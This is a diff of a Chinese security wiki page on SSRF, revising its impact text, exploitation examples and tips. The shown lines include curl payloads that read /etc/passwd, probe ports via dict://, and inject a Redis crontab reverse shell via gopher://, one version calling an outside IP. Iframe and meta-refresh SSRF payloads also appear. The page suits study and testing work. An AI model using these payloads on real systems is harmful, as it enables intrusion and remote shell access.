@@ -7,9 +7,8 @@ SSRF
 
 漏洞危害
 ----------------------------------------
-SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。
-
-内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。
++ SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。
++ 大部分情况都是GET型SSRF漏洞，仅能探测存活，扫描端口，内网域名探测等，危害十分有限。
 
 利用方式
 ----------------------------------------
@@ -21,13 +20,24 @@ SSRF利用存在多种形式以及不同的场景，针对不同场景可以使�
 
 :: 
 
-    curl -vvv 'dict://127.0.0.1:6379/info'
+	# 利用file协议查看文件
+	curl -v 'file:///etc/passwd'
 
-    curl -vvv 'file:///etc/passwd' 
+	# 利用dict探测端口
+	curl -v 'dict://127.0.0.1:22'
+	curl -v 'dict://127.0.0.1:6379/info'
 
-    # * 注意: 链接使用单引号，避免$变量问题
+	# 利用gopher协议反弹shell
+	curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'
 
-    curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a' 
+	# 利用file协议任意文件读取
+	curl -v 'http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd'
+
+	# 利用dict协议查看端口
+	curl -v 'http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22'
+
+	# 利用gopher协议反弹shell
+	curl -v 'http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'
 
 相关危险函数
 ----------------------------------------
@@ -153,14 +163,13 @@ DNS Rebinding
 - 禁止不常用的协议
 - 对DNS Rebinding，考虑使用DNS缓存或者Host白名单
 
-参考链接
+挖掘技巧
 ----------------------------------------
-- `SSRF漏洞分析与利用 <http://www.91ri.org/17111.html>`_
-- `A New Era Of SSRF <https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf>`_
-- `php ssrf technique <https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51>`_
-- `谈一谈如何在Python开发中拒绝SSRF漏洞 <https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html>`_
-- `SSRF Tips <http://blog.safebuff.com/2016/07/03/SSRF-Tips/>`_
-- `SSRF in PHP <https://joychou.org/web/phpssrf.html>`_
+- 前端传入后端HTML内容
+	+ payload: ``<iframe src="http://ssrf.jd.local/">``
+	+ payload: ``<meta http-equiv="refresh" content="0;url=http://ssrf.jd.local/"/>``
+- 图片检索功能
+	+ url参数
 
 
 .. |ssrf1| image:: ../images/ssrf1.jpg
